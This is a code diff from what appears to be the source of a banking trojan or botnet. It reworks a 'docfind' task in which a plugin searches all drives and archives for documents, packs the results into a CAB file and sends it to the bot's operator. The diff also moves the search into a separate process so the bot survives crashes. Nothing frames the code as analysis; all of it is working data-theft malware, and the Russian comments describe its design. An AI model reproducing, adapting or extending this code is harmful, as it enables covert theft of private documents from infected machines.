@@ -13,6 +13,7 @@
 #include "BotHTTP.h"
 #include "Inject.h"
 #include "BotHosts.h"
+#include "BotCore.h"
 #include "Plugins.h"
 #include "DllLoader.h"
 #include <shlobj.h>
@@ -745,8 +746,10 @@ bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 	return res;
 }
 
-bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
+static DWORD WINAPI ProcessDocFind(void*)
 {
+	BOT::Initialize();
+
 	typedef BOOL (WINAPI *typeBuildStubDllMain)(HANDLE DllHandle, DWORD Reason, LPVOID);
 	BYTE* data = 0;
 	DWORD size = 0;
@@ -774,13 +777,19 @@ bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 					pSHGetFolderPathA( 0, CSIDL_MYDOCUMENTS,  0, 0, path );
 					pPathAppendA( path, "search" );
 					TASKDBG( "Task", "Поиск файлов завершен, отправляем папку %s", path );
-					File::GetTempName(tmpName);
-					HCAB cab = CreateCab(tmpName);
-					AddDirToCab( cab, path, "docfind" );
-					CloseCab(cab);
-					TASKDBG( "Task", "сформирован cab файл %s", tmpName );
-					DataGrabber::SendCabDelayed( 0, tmpName, "docfind" );
-					pDeleteFileA(tmpName);
+					//отправляем если папка не пустая
+					if( !pPathIsDirectoryEmptyA(path) )
+					{
+						File::GetTempName(tmpName);
+						HCAB cab = CreateCab(tmpName);
+						AddDirToCab( cab, path, "docfind" );
+						CloseCab(cab);
+						TASKDBG( "Task", "сформирован cab файл %s", tmpName );
+						DataGrabber::SendCabDelayed( 0, tmpName, "docfind" );
+						pDeleteFileA(tmpName);
+					}
+					else
+						TASKDBG( "Task", "Папка %s пустая", path );
 					Directory::Delete(path);
 				}
 			}
@@ -788,7 +797,17 @@ bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 		}
 		MemFree(data);
 	}
-	return res;
+	return 0;
+}
+
+//Загружает плагин (dll) который запускается в отдельном процессе и производит поиск по всем дискам
+//в поисках текстовых документов по заложенной внутри плагина маске, поиск ведется также и в архивах.
+//Запускаем в отдельном процессе, а не в текущем из-за того что плагин может нестабильно работать
+//из-за чего бот может вылететь
+bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
+{
+	MegaJump(ProcessDocFind);
+	return true;
 }
 
 bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
